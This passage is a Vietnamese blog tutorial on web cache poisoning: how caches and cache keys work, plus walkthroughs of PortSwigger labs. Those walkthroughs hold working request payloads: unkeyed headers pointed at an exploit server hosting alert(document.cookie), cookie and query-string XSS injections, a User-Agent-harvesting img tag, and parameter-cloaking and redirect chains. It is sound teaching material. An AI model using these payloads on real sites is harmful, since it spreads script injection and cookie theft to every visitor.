---
layout: single
title: "Web Cache Poisoning"
date: 2026-04-30
classes: wide
categories: [Penetration-Testing]
tags: [web, cache-poisoning, portswigger]
---

## I. Lời mở đầu.

Trong các hệ thống web hiện đại, caching gần như là một phần không thể thiếu. Từ browser cache, reverse proxy cho tới CDN, tất cả đều được thiết kế để giảm tải cho server và cải thiện tốc độ phản hồi cho người dùng. Nhờ cache, những tài nguyên được request nhiều lần sẽ không cần phải xử lý lại từ đầu, giúp hệ thống hoạt động hiệu quả hơn rất nhiều.

Tuy nhiên, cũng giống như nhiều cơ chế tối ưu khác, cache không chỉ mang lại lợi ích mà còn tiềm ẩn rủi ro nếu bị cấu hình sai. Một trong những kiểu tấn công khai thác trực tiếp vào cơ chế này là **Web Cache Poisoning** – nơi attacker không cần phá logic chính của ứng dụng, mà chỉ cần “đầu độc” dữ liệu trong cache để ảnh hưởng đến hàng loạt người dùng khác.

Trong thực tế pentest, dạng lỗi này thường không lộ rõ như XSS hay SQLi thông thường. Nó đòi hỏi phải hiểu cách hệ thống cache hoạt động, quan sát kỹ HTTP headers, và thử nghiệm nhiều biến thể request để tìm ra sự khác biệt giữa “what affects response” và “what affects cache key”. Chính vì vậy, nhiều hệ thống production vẫn dính lỗi này dù đã được kiểm tra bảo mật. 

Vậy Web Cache Poisoning thực sự hoạt động như thế nào, cách khai thác ra sao và làm thế nào để phòng tránh? Hãy cùng mình đi sâu vào trong các phần tiếp theo.

![image.png](/assets/images/web-cache-poisoning/image.png)

## II. Web cache hoạt động như thế nào ?

Để hiểu được Web cache poisoning , trước tiên phải nắm rõ cách caching hoạt động trong thực tế .

Về cơ bản cache là 1 lớp trung gian nằm giữa client và server , có nhiệm vụ lưu trữ tạm thời các respone để phục vụ cho các request tương tự trong tương lại 

Web caching là quá trình lưu trữ bản sao của các tài nguyên trên trang web , thường bao gồm là các video , hình ảnh , tệp CSS và JS trên máy chủ quản lý cache CDN ( Content delivery network ) hoặc là trên máy tính của người dùng. Khi người dùng truy cập lần đầu tiên ,trình duyệt sẽ tải toàn bộ tải nguyên từ máy chủ gốc . Cho tới lần truy cập cho lần sau , thì các tài nguyên đó sẽ được lưu trong Cache sẽ được sử dụng lại thay vì tải lại toàn bộ. Điều này làm cho trang web tải nhanh hơn cải thiện trải nghiệm cho người dùng .

![image.png](/assets/images/web-cache-poisoning/image%201.png)

### 1. Các loại cache phổ biến

Trong hệ thống web, cache thường được chia thành hai loại chính:

- **Private cache**: thường nằm ở phía browser, chỉ phục vụ cho một user cụ thể. Loại cache này có thể chứa dữ liệu liên quan đến session hoặc thông tin cá nhân, nên không được chia sẻ.
- **Shared cache**: nằm ở các tầng trung gian như reverse proxy hoặc CDN. Đây là loại cache phục vụ cho nhiều user khác nhau và cũng chính là mục tiêu chính của các cuộc tấn công Web Cache Poisoning.

Chính vì shared cache phục vụ nhiều người dùng, nên chỉ cần một response bị “đầu độc” thì hậu quả sẽ lan rộng ra toàn bộ những ai truy cập cùng resource đó.

### 2. Cache key – “trái tim” của cơ chế caching

Trong quá trình xử lý một HTTP request, cache server không lưu toàn bộ nội dung của request để so sánh cho những lần truy cập sau. Thay vào đó, nó trích xuất một tập hợp các thành phần nhất định từ request và sử dụng chúng để tạo thành một giá trị đại diện, gọi là *cache key*. Giá trị này đóng vai trò quyết định trong việc cache có thể tái sử dụng một response đã lưu hay không.

Thông thường, cache key được xây dựng từ các thành phần như đường dẫn URL, chuỗi truy vấn, và header Host. Khi một request mới được gửi đến, cache sẽ tạo cache key tương ứng và so sánh với các key đã tồn tại. Nếu tìm thấy một key trùng khớp, cache sẽ coi hai request là tương đương và trả về response đã được lưu trước đó mà không cần chuyển tiếp request đến origin server.

Tuy nhiên, không phải toàn bộ dữ liệu trong request đều được đưa vào cache key. Những thành phần còn lại, dù vẫn có thể ảnh hưởng đến cách server tạo response, nhưng không được sử dụng để định danh trong cache, được gọi là *unkeyed inputs*.

Những thành phần này tạo ra một khoảng chênh lệch quan trọng giữa hai quá trình: một bên là cách response được sinh ra, và bên còn lại là cách response được định danh trong cache.

Chính sự không đồng nhất này là nền tảng cho Web Cache Poisoning. Nếu attacker kiểm soát được một đầu vào có khả năng ảnh hưởng đến nội dung response nhưng lại không nằm trong cache key, họ có thể khiến server tạo ra một response mang nội dung độc hại. Nếu response đó được cache lưu lại, mọi request sau có cùng cache key sẽ nhận lại chính response này, bất kể chúng không chứa payload ban đầu.

Do đó, khi phân tích một hệ thống có sử dụng cache, điều quan trọng không chỉ là xem những gì ảnh hưởng đến response, mà còn phải xác định chính xác những gì được sử dụng để tạo cache key. Bất kỳ sự khác biệt nào giữa hai yếu tố này đều có thể trở thành điểm khởi đầu cho một cuộc tấn công.

### 3. Vai trò của HTTP headers trong caching

Caching không chỉ phụ thuộc vào cache server, mà còn bị điều khiển bởi các HTTP headers do server trả về. húng ta có thể nhận biết một trang web thực hiện caching tài nguyên hay không thông qua một số header trong response như **`X-Cache`**, **`Age`**, **`Cache-Control`**

- **Cache-Control**: xác định cách response được cache (public, private, max-age, no-store, ...)
- **Age**: cho biết response đã được cache bao lâu
- **Vary**: chỉ định những header nào cần được đưa vào cache key

Ví dụ:

```
Cache-Control: public, max-age=600
```

Điều này có nghĩa là response có thể được cache và sử dụng trong vòng 10 phút.

Nếu cấu hình không đúng, ví dụ như thiếu header `Vary` cho những yếu tố ảnh hưởng tới response, cache có thể phục vụ sai nội dung cho user — hoặc tệ hơn là phục vụ nội dung đã bị attacker kiểm soát.

## III. Xây dựng 1 cuộc tấn công Web cache poisoning

![image_11e008f.png](/assets/images/web-cache-poisoning/image_11e008f.png)

### 1. Detech

Bước đầu tiên chắc hẳn phải là phát hiện ra trang web có sử dụng web caching hay không , việc này thường khá đơn giản vì chúng t có thể chỉ cần quan sát nội dung của các header trả về trong respone. Dấu hiệu rõ ràng nhất thường là các header với giá trị tương ứng : Cache-control với từ khóa max-age, X-cache, với từ khóa miss với hit.

### **2. Tìm kiếm unkeyed inputs**

Các unkeyed inputs đóng vai trò quyết định kết quả cuộc tấn công của chúng ta. Chúng ta sẽ cần tìm kiếm các giá trị unkeyed inputs được server lưu trữ và chứa trong tài nguyên cache trả về ở các lần request tiếp theo. Với số trường hợp cần thử khả lớn, nên chúng ta cần sử dụng các công cụ hỗ trợ, ví dụ như extension [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) của Burp Suite.

### **3. Poisoning**

Sau khi xác định được mục tiêu và vị trí tấn công (unkeyed input), bước tiếp theo là thực hiện đầu độc (poisoning) bộ nhớ cache. Bước này phụ thuộc vào mục đích của kẻ tấn công và trường hợp cụ thể của trang web mà xây dựng các payload poisoning khác nhau. Thông thường có thể tạo ra các payload kiểm tra lỗ hổng XSS.

### **4. Check**

Cuối cùng, chúng ta thực hiện kiếm tra payload đã được lưu trữ thành công hay chưa. Chẳng hạn trong response trả về (của request đang chứa payload), giá trị header **`X-Cache`** thay đổi từ **`hit`** sang **`miss`**, nghĩa là response này đã được server backend xử lý và trả về từ server gốc. Loại bỏ payload khỏi request và gửi thêm một lần, trong response trả về, nếu giá trị header **`X-Cache`** thay đổi từ **`miss`** sang **`hit`** và trong response vẫn chứa payload trong request trước, nghĩa là reponse nguy hiểm đã được hệ thống caching thành công.

> Trong thực tế, việc tìm các unkeyed input thủ công khá tốn thời gian, vì nhiều thay đổi là rất nhỏ và khó nhận ra. Do đó, các công cụ như Param Miner trong Burp Suite thường được sử dụng để tự động fuzz header và phát hiện những input có ảnh hưởng đến response. Tuy nhiên, khi test trên hệ thống thật, cần cẩn thận sử dụng cache buster (ví dụ thêm param ngẫu nhiên) để tránh việc vô tình đầu độc cache của người dùng thật.
> 

## IV. Khai thác lỗ hổng Web cache poisoning

### Khai thác lỗ hổng do sai sót trong thiết kế bộ nhớ cache.

![image_cd17624c.png](/assets/images/web-cache-poisoning/image_cd17624c.png)

Sau khi đã hiểu được vai trò của cache key và unkeyed inputs, bước tiếp theo là khai thác lỗ hổng này trong thực tế. 

Một trong những kịch bản phổ biến nhất là khi unkeyed input được phản chiếu trực tiếp vào response mà không qua xử lý. Ví dụ, một số hệ thống sử dụng header như `X-Forwarded-Host` để xây dựng các URL động trong HTML. Nếu giá trị của header này được đưa thẳng vào response và không được xử lí an toàn, attacker có thể chèn payload vào đó. Khi response này được cache lại, tất cả người dùng truy cập cùng endpoint sẽ nhận nội dung đã bị chèn, dẫn đến các cuộc tấn công như XSS trên diện rộng

Để minh họa cho phương thức tấn công này thì mời các bạn xem qua bài lab sau đây trên PortSwigger

![image.png](/assets/images/web-cache-poisoning/image%202.png)

Mục tiêu của bài là khiến trình duyệt của nạn nhân thực thi `alert(document.cookie)` bằng cách đầu độc cache của trang chủ.

Trong bài lab này, mục tiêu là lợi dụng header `X-Forwarded-Host` để đầu độc cache và thực thi JavaScript trên trình duyệt nạn nhân.

Trước tiên, bật Burp Suite và truy cập trang chủ. Trong tab Proxy → HTTP history, lấy request GET của trang chủ và gửi sang Repeater để thao tác.

Để tránh ảnh hưởng cache thật trong quá trình test, thêm một tham số cache buster như `?cb=1234`. Sau đó, thêm header:

```
X-Forwarded-Host: example.com
```

Gửi request và quan sát response. Có thể thấy giá trị của header này được dùng để build URL tuyệt đối cho file `/resources/js/tracking.js`. Khi gửi lại request nhiều lần và thấy xuất hiện `X-Cache: hit`, chứng tỏ response này đã bị cache dù header thay đổi → đây là unkeyed input.

![image.png](/assets/images/web-cache-poisoning/image%203.png)

Sau khi gửi request nhiều lần nhằm để xác nhận suy đoán thì mình thấy được server trả về như này 

![image.png](/assets/images/web-cache-poisoning/image%204.png)

Tiếp theo, truy cập exploit server của lab và tạo một file đúng đường dẫn:

```
/resources/js/tracking.js
```

Với nội dung:

![image.png](/assets/images/web-cache-poisoning/image%205.png)

```
alert(document.cookie)
```

Sau đó quay lại Repeater, xóa cache buster và sửa header thành:

```
X-Forwarded-Host: <exploit-server-id>.exploit-server.net
```

Gửi request nhiều lần cho đến khi response trả về chứa domain exploit server và header `X-Cache: hit`. Lúc này cache đã bị đầu độc.

![image.png](/assets/images/web-cache-poisoning/image%206.png)

Cuối cùng, truy cập lại URL trang chủ trên trình duyệt để mô phỏng nạn nhân. Nếu payload chạy (hiện alert), nghĩa là khai thác thành công. Do cache trong lab chỉ tồn tại khoảng 30 giây, cần gửi request lặp lại để duy trì trạng thái poisoned nếu cần.

![image.png](/assets/images/web-cache-poisoning/image%207.png)

![image.png](/assets/images/web-cache-poisoning/image%208.png)

Qua bài tiếp theo là 

**Tấn công bộ nhớ cache web bằng cookie không được mã hóa** 

![image.png](/assets/images/web-cache-poisoning/image%209.png)

Ở bài này, thay vì header, điểm yếu nằm ở việc **cookie ảnh hưởng đến response nhưng không nằm trong cache key**.

Mở lab bằng Burp Suite và truy cập trang chủ. Quan sát response ban đầu sẽ thấy server set cookie `fehost=prod-cache-01`. Khi reload lại trang, giá trị của cookie này được phản ánh vào trong một đoạn JavaScript trong response.

![image.png](/assets/images/web-cache-poisoning/image%2010.png)

Gửi request sang Repeater, thêm cache buster rồi thử sửa giá trị cookie thành chuỗi bất kỳ. Response sẽ phản hồi lại đúng giá trị đó ⇒ chứng tỏ cookie này ảnh hưởng trực tiếp đến nội dung trả về.

![image.png](/assets/images/web-cache-poisoning/image%2011.png)

Tiếp theo, chèn payload XSS vào cookie, ví dụ:

```
fehost=abc"-alert(1)-"abc
```

Gửi request nhiều lần cho đến khi thấy payload xuất hiện trong response kèm `X-Cache: hit`. Lúc này response độc hại đã bị cache.

![image.png](/assets/images/web-cache-poisoning/image%2012.png)

Truy cập lại trang trên trình duyệt, nếu `alert(1)` được thực thi thì khai thác thành công. Sau đó có thể tiếp tục gửi request để giữ cache luôn ở trạng thái poisoned cho đến khi nạn nhân truy cập.

Ý chính của lab: dù là cookie, nếu nó không được đưa vào cache key nhưng lại được dùng để build response, attacker hoàn toàn có thể biến nó thành điểm tiêm payload và phát tán qua cache.

### **Thực hành : Web cache poisoning with multiple headers**

![image.png](/assets/images/web-cache-poisoning/image%2013.png)

Ở bài này, một header đơn lẻ không đủ để khai thác. Cần kết hợp nhiều header để tạo ra response độc hại rồi đưa nó vào cache.

Mở lab bằng Burp Suite, truy cập trang và trong HTTP history tìm request tới `/resources/js/tracking.js`, sau đó gửi sang Repeater.

Thêm cache buster và thử `X-Forwarded-Host: example.com` nhưng sẽ thấy không có thay đổi đáng kể bởi vì nó đã được định nghĩa cache key rồi

![image.png](/assets/images/web-cache-poisoning/image%2014.png)

Tiếp theo, thay bằng:

```
X-Forwarded-Scheme: http
```

Response sẽ trả về redirect 302 sang HTTPS. Điều này cho thấy server dùng header này để build URL redirect.

![image.png](/assets/images/web-cache-poisoning/image%2015.png)

Bây giờ kết hợp cả hai:

```
X-Forwarded-Host: example.com
X-Forwarded-Scheme: nothttps
```

Lúc này header `Location` sẽ trỏ tới `https://example.com/...` ⇒ đã kiểm soát được URL redirect.

> 
> 
> 
> Để cho các bạn nào thắc mắc vì sao dùng nohttps thì đây là "mánh khóe" để vượt qua **Cache Key**.
> 
> Thông thường, các hệ thống Cache (như Cloudflare, Varnish) được cấu hình để phân biệt nội dung dựa trên một số yếu tố (Cache Key). Một cấu hình rất phổ biến là:
> 
> - Nếu yêu cầu là `HTTPS` -> Trả về trang A.
> - Nếu yêu cầu là `HTTP` -> Trả về lệnh Redirect sang HTTPS.
> 
> Nếu bạn gửi `X-Forwarded-Scheme: http`, hệ thống Cache có thể nhận diện đây là một yêu cầu HTTP tiêu chuẩn và nó lưu kết quả Redirect đó vào một "ngăn chứa" dành riêng cho HTTP. Nó không ảnh hưởng đến những người dùng đang truy cập bằng HTTPS thật sự.
> 
> **Tuy nhiên, khi bạn dùng `nothttps`:**
> 
> 1. **Server gốc (Backend):** Vẫn hiểu `nothttps` nghĩa là "không phải HTTPS" (giống như `http`), nên nó vẫn trả về lệnh Redirect kèm cái Host giả mạo (`example.com`).
> 2. **Bộ phận Cache:** Vì `nothttps` là một giá trị lạ, không nằm trong quy tắc phân loại Cache Key thông thường (thường chỉ phân biệt `http` và `https`). Cache có thể coi đây là một yêu cầu HTTPS bình thường và **ghi đè (đầu độc)** cái phản hồi Redirect độc hại đó vào bộ nhớ đệm của trang HTTPS chính thức.
> 
> **Tóm lại:**
> 
> - Dùng **`http`** để **thử nghiệm** logic của server.
> - Dùng **`nothttps`** để **đánh lừa bộ nhớ đệm**, ép nó lưu trữ phản hồi sai lệch vào nơi mà nó không nên lưu, từ đó làm tất cả người dùng khác (dù dùng HTTPS thật) cũng bị redirect sang `example.com`

Tiếp theo, lên exploit server tạo file:

```
/resources/js/tracking.js
```

với payload:

```
alert(document.cookie)
```

Quay lại Repeater, sửa header:

```
X-Forwarded-Host: <exploit-server-id>.exploit-server.net
X-Forwarded-Scheme: nothttps
```

Gửi request nhiều lần cho đến khi thấy response chứa domain exploit server và `X-Cache: hit` ⇒ cache đã bị đầu độc.

Cuối cùng, reload trang chủ trên trình duyệt để mô phỏng nạn nhân. Nếu `alert(document.cookie)` chạy thì khai thác thành công. Do cache có thời gian sống ngắn, cần gửi request lặp lại để giữ trạng thái poisoned.

![image.png](/assets/images/web-cache-poisoning/image%2016.png)

Ý chính: một số case cần **chain nhiều unkeyed input** lại với nhau thì mới tạo được response đủ điều kiện để cache và khai thác.

### **Thực hành: Tấn công làm nhiễm độc bộ nhớ cache web có chủ đích bằng cách sử dụng một tiêu đề không xác định.**

![image.png](/assets/images/web-cache-poisoning/image%2017.png)

Ở bài này, điểm khác biệt so với các lab trước là không chỉ poison cache, mà còn phải **target đúng nhóm user cụ thể**. Nguyên nhân là do server sử dụng header `Vary`, khiến một số header (ở đây là `User-Agent`) trở thành một phần của cache key. Nếu không khớp, payload sẽ không được serve cho victim.

Quá trình khai thác có thể tóm gọn như sau:

- Truy cập trang chủ, lấy request và dùng **Param Miner** để tìm input ẩn → phát hiện header `X-Host`.

![image.png](/assets/images/web-cache-poisoning/image%2018.png)

- Gửi request sang Repeater, thêm cache-buster rồi thử `X-Host: example.com` → thấy header này được dùng để generate URL load file `/resources/js/tracking.js`.
- Chuẩn bị exploit server với file `/resources/js/tracking.js` chứa payload:
    
    ```
    alert(document.cookie)
    ```
    
- Sửa lại request:
    
    ```
    X-Host: <exploit-server>
    ```
    
    gửi đến khi thấy `X-Cache: hit` → đã poison cache thành công.
    
    ![image.png](/assets/images/web-cache-poisoning/image%2019.png)
    

Đến đây vẫn chưa đủ, vì cache đang bị phân tách theo `User-Agent`.

- Tận dụng chức năng comment, chèn:
    
    ```
    <img src="https://<exploit-server>/foo">
    ```
    
    để ép victim gửi request về server của bạn.
    
- Mở log trên exploit server, chờ victim truy cập và lấy **User-Agent** của họ.
- Quay lại request trong Repeater:
    - thêm đúng `User-Agent` của victim
    - bỏ cache-buster
- Gửi lại request đến khi có `X-Cache: hit`.

![image.png](/assets/images/web-cache-poisoning/image%2020.png)

Cuối cùng, khi victim truy cập trang, họ sẽ nhận đúng response đã bị poison theo `User-Agent` của họ và payload `alert(document.cookie)` sẽ được thực thi.

![image.png](/assets/images/web-cache-poisoning/image%2021.png)

Điểm mấu chốt của lab này không nằm ở kỹ thuật inject, mà ở việc hiểu cách `Vary` ảnh hưởng đến cache key và cách điều khiển request để nhắm trúng đối tượng cụ thể.

### Lab: Combining web cache poisoning vulnerabilities

Bài này không còn là một lỗ hổng đơn lẻ nữa, mà yêu cầu **chain nhiều kỹ thuật lại với nhau**. Ý tưởng chính là: poison một response chứa payload, nhưng vì victim dùng tiếng Anh (không trigger XSS), nên phải tìm cách **ép họ chuyển sang ngôn ngữ khác** rồi mới dính payload.

![image.png](/assets/images/web-cache-poisoning/image%2022.png)

- Truy cập trang, dùng **Param Miner** → phát hiện 2 header quan trọng:`X-Forwarded-Host` và `X-Original-URL`.

![image.png](/assets/images/web-cache-poisoning/image%2023.png)

- Test `X-Forwarded-Host` → thấy có thể control source của file:
    
    ```
    /resources/json/translations.json
    ```
    
    → đây là điểm inject.
    
    ![image.png](/assets/images/web-cache-poisoning/image%2024.png)
    
- Chuẩn bị exploit server:
    - path: `/resources/json/translations.json`
    - thêm header:
        
        ```
        Access-Control-Allow-Origin: *
        ```
        
    - body JSON chứa payload XSS trong phần ngôn ngữ (ví dụ `es`).
- Gửi request:
    
    ```
    GET /?localized=1
    Cookie: lang=es
    X-Forwarded-Host: <exploit-server>
    ```
    
    → spam đến khi có `X-Cache: hit`
    
    → đã poison trang tiếng Tây Ban Nha.
    

Nhưng victim dùng tiếng Anh nên chưa dính.

- Quan sát thấy khi đổi ngôn ngữ, web redirect qua:
    
    ```
    /setlang/es
    ```
    
    và set cookie `lang=es`.
    
    ![image.png](/assets/images/web-cache-poisoning/image%2025.png)
    
- Thử dùng:
    
    ```
    X-Original-URL: /setlang/es
    ```
    
    → không cache được (do có `Set-Cookie`).
    
- Nhưng nếu dùng:
    
    ```
    X-Original-URL: /setlang\es
    ```
    
    → server normalize → trả về **302 redirect**
    
    → response này **cache được**
    

→ đây là cách ép user chuyển sang tiếng Tây Ban Nha.

![image.png](/assets/images/web-cache-poisoning/image%2026.png)

Khi nhấn view details , thì alert sẽ được hiện ra và sẽ solve được bài lab

![image.png](/assets/images/web-cache-poisoning/image%2027.png)

![image.png](/assets/images/web-cache-poisoning/image%2028.png)

### Chain exploit

1. Poison:
    
    ```
    GET /?localized=1
    + X-Forwarded-Host → load JSON độc hại
    ```
    
2. Ngay sau đó poison tiếp:
    
    ```
    GET /
    + X-Original-URL: /setlang\es
    ```
    
    → ép tất cả user sang tiếng Tây Ban Nha
    

### Kết quả

- Victim truy cập `/`
- Bị redirect sang `/setlang/es`
- Trang load bản dịch từ JSON độc hại
- → trigger `alert(document.cookie)`

## **Khai thác các lỗ hổng trong quá trình triển khai bộ nhớ đệm**

Trong các kỹ thuật web cache poisoning cơ bản, kẻ tấn công thường tận dụng các **input không nằm trong cache key** (unkeyed input) như header hoặc cookie để chèn payload. Tuy nhiên, cách tiếp cận này tuy hiệu quả nhưng nó chỉ là bước khởi đầu so với những gì ta có thể làm được với lỗ hổng này 

Trong thực tế, nhiều hệ thống cache tồn tại những sai lệch tinh vi trong cách **xây dựng cache key**, mở ra một hướng khai thác mạnh hơn: tấn công thông qua **cache implementation flaws**.

### 1. Cache key không phản ánh chính xác request

Theo lý thuyết, cache key được xây dựng từ các thành phần của request như:

- URL path
- Query string
- Host header

Ví dụ:

```
GET /?param=abc
```

→ Cache key kỳ vọng: `/ ?param=abc`

Tuy nhiên, nhiều hệ thống cache thực hiện các bước xử lý bổ sung trước khi tạo key, chẳng hạn:

- Loại bỏ toàn bộ query string
- Loại bỏ một số query parameter
- Bỏ port trong Host header
- Chuẩn hóa (normalize) encoding

Kết quả là:

> Cache key chỉ là phiên bản đã được biến đổi của request, không phải dữ liệu gốc mà ứng dụng xử lý.
> 

### 2. Sai lệch giữa cache và ứng dụng (desynchronization)

Lỗ hổng xuất hiện khi:

- Cache coi hai request là giống nhau (cùng cache key)
- Nhưng ứng dụng backend lại xử lý chúng khác nhau

Điều này dẫn đến việc một response độc hại có thể được lưu cache và phục vụ cho nhiều người dùng khác.

Chúng ta có thể giả sử như 

```
GET /
Host: victim.com:1337
```

Backend sử dụng giá trị đầy đủ của Host để tạo redirect:

```
HTTP/1.1 302 Found
Location: https://victim.com:1337/en
```

Nếu cache loại bỏ phần port khi tạo key, response này sẽ được lưu với key tương ứng với `victim.com`.

Bước 2 : Người dùng truy cập bình thường

```
GET /
Host: victim.com
```

Cache trả về response đã lưu:

```
Location: https://victim.com:1337/en
```

Kết quả:

- Người dùng bị redirect đến một endpoint không hợp lệ
- Có thể dẫn đến denial-of-service hoặc chuyển hướng độc hại

## 3. Phương pháp khai thác tổng quát

Để khai thác nhóm lỗ hổng này, cần thực hiện ba bước chính:

### 3.1 Xác định cache oracle

Một endpoint có thể cho biết response đến từ cache hay backend, ví dụ:

- Header như `X-Cache: hit/miss`
- Header `Age`
- Thời gian phản hồi

### 3.2 Phân tích cách cache xử lý input

Mục tiêu là tìm ra các biến đổi trong quá trình tạo cache key:

- Query string có bị loại bỏ không
- Có parameter nào bị bỏ qua không
- Host có bị chuẩn hóa không
- Encoding có bị normalize không

Thực hiện bằng cách gửi nhiều request tương tự và so sánh phản hồi.

### 3.3 Tìm “gadget” để khai thác

Gadget là nơi ứng dụng sử dụng dữ liệu đầu vào, ví dụ:

- Reflected XSS
- Open redirect
- Dynamic script import
- JSONP callback

Khi kết hợp gadget với sai lệch cache key, có thể biến các lỗ hổng “không khai thác được” thành tấn công thực tế.

## 5. Một số kỹ thuật phổ biến

- **Header Manipulation**: Chèn mã độc vào các tiêu đề HTTP (như `X-Forwarded-Host`) mà ứng dụng phản hồi trực tiếp vào nội dung trang (thường dẫn đến [**Cross-Site Scripting (XSS)**](https://portswigger.net/web-security/cross-site-scripting)).
- **Fat GET requests**: Gửi yêu cầu GET nhưng kèm theo thân tin nhắn (body) chứa các tham số độc hại. Một số hệ thống cache chỉ kiểm tra URL nhưng máy chủ ứng dụng lại xử lý dữ liệu trong body.
- **Cache Parameter Cloaking**: Lợi dụng sự khác biệt trong cách máy chủ cache và máy chủ ứng dụng phân tách các tham số (ví dụ: dùng dấu `;` thay vì `&`) để ẩn giấu các tham số độc hại.
- **Unkeyed Port**: Thêm một cổng (port) không hợp lệ vào tiêu đề `Host`. Nếu cache bỏ qua cổng này khi tạo khóa nhưng ứng dụng lại sử dụng nó để tạo URL, nó có thể gây ra lỗi [**Denial of Service (DoS)**](https://cpdos.org/) cho mọi người dùng truy cập trang đó.

### Unkeyed query string

Cache bỏ qua toàn bộ query string, nhưng backend vẫn xử lý:

```
GET /?q=<payload>
```

→ Có thể biến reflected XSS thành stored XSS thông qua cache.

### Lab: Web Cache Poisoning via Unkeyed Query String

![image.png](/assets/images/web-cache-poisoning/image%2029.png)

Trong bài lab này, ứng dụng tồn tại một lỗi phổ biến nhưng nguy hiểm: **query string không được đưa vào cache key**. Điều này cho phép kẻ tấn công chèn payload vào response, sau đó khiến cache phục vụ nội dung độc hại cho những người dùng truy cập URL hợp lệ.

Thông thường, cache sẽ sử dụng toàn bộ URL (bao gồm query string) để tạo cache key. Tuy nhiên trong lab này:

- Cache **bỏ qua query string**
- Backend vẫn **xử lý và phản hồi dựa trên query**

Điều này tạo ra sự không nhất quán:

- Cùng một cache key
- Nhưng response có thể khác nhau tùy theo query

### Các bước khai thác

**Bước 1: Xác định query string không nằm trong cache key**

Truy cập trang chủ, gửi request vào Burp Repeater và thử thêm các tham số bất kỳ:

```
GET /?test=123
GET /?test=456
```

Quan sát thấy:

- Response không thay đổi
- Header trả về `X-Cache: hit`

![image.png](/assets/images/web-cache-poisoning/image%2030.png)

Điều này cho thấy query string không ảnh hưởng đến cache key.

**Bước 2: Sử dụng cache buster hợp lệ**

Vì query không dùng để bust cache được, cần sử dụng header:

```
Origin: https://abc.com
```

Header này giúp tạo request mới (cache miss) mà không ảnh hưởng logic ứng dụng.

![image.png](/assets/images/web-cache-poisoning/image%2031.png)

**Bước 3: Kiểm tra khả năng** 

Gửi request:

```
GET /?input=hello
```

Nếu giá trị `hello` xuất hiện trong response → tồn tại reflection.

**Bước 4: Inject payload XSS**

Thực hiện chèn payload:

```
GET /?evil='/><script>alert(1)</script>
Origin: https://abc.com
```

Gửi request nhiều lần cho đến khi response trả về:

```
X-Cache: hit
```

Điều này chứng tỏ response chứa payload đã được cache.

![image.png](/assets/images/web-cache-poisoning/image%2032.png)

**Bước 5: Xác nhận cache đã bị nhiễm**

Gửi lại request **không có query**:

```
GET /
Origin: https://abc.com
```

Nếu vẫn thấy payload trong response → cache đã bị poison thành công.

![image.png](/assets/images/web-cache-poisoning/image%2033.png)

**Bước 6: Khai thác đối với nạn nhân**

- Loại bỏ header cache buster (`Origin`)
- Tiếp tục gửi request chứa payload để duy trì trạng thái cache
- Khi nạn nhân truy cập trang chủ → payload sẽ được thực thi

![image.png](/assets/images/web-cache-poisoning/image%2034.png)

![image.png](/assets/images/web-cache-poisoning/image%2035.png)

### Kết luận

Lỗ hổng xuất phát từ việc:

- Cache **không tính query string vào cache key**
- Backend vẫn **xử lý query và sinh response động**

Điều này cho phép attacker:

- Biến một lỗ hổng XSS phản chiếu thành XSS lưu trữ thông qua cache
- Ảnh hưởng đến tất cả người dùng truy cập trang mà không cần tương tác

### Parameter cloaking

Khai thác sự khác biệt trong cách parse query:

```
GET /?a=1?b=payload
```

- Cache: thấy hai parameter, loại bỏ `b`
- Backend: coi toàn bộ là giá trị của `a`

### Parameter Cloaking – Khai thác sai lệch parser giữa cache và backend

Trong lab này, điểm mấu chốt không nằm ở việc tìm XSS, mà nằm ở việc **làm cho cache và backend “hiểu request theo hai cách khác nhau”**. Cụ thể, tham số `utm_content` bị loại khỏi cache key, trong khi backend vẫn xử lý đầy đủ nội dung của nó. Điều này mở ra khả năng “giấu” payload bên trong tham số tưởng như vô hại này.

Trang web sử dụng một file JavaScript `/js/geolocate.js` theo cơ chế JSONP, với tham số `callback` quyết định tên hàm sẽ được thực thi. Ví dụ, request:

```
GET /js/geolocate.js?callback=setCountryCookie
```

sẽ trả về:

```
setCountryCookie({...})
```

Vấn đề là nếu bạn chỉ sửa `callback` trực tiếp thì payload sẽ không lan sang người khác, vì tham số này nằm trong cache key. Do đó, cần một cách để **ghi đè giá trị `callback` ở backend nhưng vẫn giữ cache key “sạch”**.

Đây là lúc parameter cloaking phát huy tác dụng. Cache chỉ parse tham số dựa trên `&`, còn backend (trong trường hợp này giống hành vi của Rails) lại hiểu thêm cả dấu `;` là delimiter. Vì vậy, nếu bạn gửi request như sau:

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

thì cache sẽ nhìn thấy request với key tương đương:

```
/js/geolocate.js?callback=setCountryCookie
```

tức là hoàn toàn bình thường. Tuy nhiên, backend lại parse thành hai tham số `callback`, và theo quy tắc xử lý, giá trị cuối sẽ được ưu tiên. Kết quả là response thực tế trở thành:

```
alert(1)({...})
```

Lúc này, bạn đã có một response chứa payload nhưng vẫn mang cache key hợp lệ. Chỉ cần gửi request này lặp lại cho đến khi thấy phản hồi có `X-Cache: hit`, nghĩa là cache đã lưu phiên bản độc hại.

Từ đây, nạn nhân không cần truy cập URL chứa payload. Họ chỉ cần load trang bình thường, trình duyệt sẽ tự động import `/js/geolocate.js`, và cache sẽ trả về phiên bản đã bị đầu độc. Payload được thực thi ngay lập tức.

Điểm đáng chú ý của lab này là payload không được inject trực tiếp vào tham số nguy hiểm, mà được “giấu” trong một tham số bị bỏ qua bởi cache. Chính sự không nhất quán trong cách parse giữa hai thành phần đã biến một input tưởng như vô hại thành điểm khai thác.

Ngoài ra còn 1 vài kĩ thuật khác mà bạn có thể tham khảo như sau : 

### Duplicate parameter override

```
GET /?a=1&b=2;a=payload
```

- Cache: `a=1`
- Backend: `a=payload` (ưu tiên giá trị sau)

### Normalization

Cache chuẩn hóa encoding:

```
param="><script>
param=%22%3E%3Cscript%3E
```

→ Hai request có cùng cache key nhưng backend xử lý khác nhau.

### Fat GET request

Gửi body trong GET request:

```
GET /?a=1
(body) a=payload
```

- Cache dùng query string
- Backend dùng body

### Cache key injection

Nếu cache key được ghép từ nhiều thành phần mà không escape đúng cách, có thể tạo collision giữa các request khác nhau.

### 6. Cache rules – điều kiện quyết định cái gì được cache

Bên cạnh cache key, một yếu tố quan trọng khác ảnh hưởng trực tiếp đến hành vi của cache là **cache rules**. Nếu cache key quyết định *request nào giống nhau*, thì cache rules sẽ quyết định *response nào được phép lưu lại và lưu trong bao lâu*.

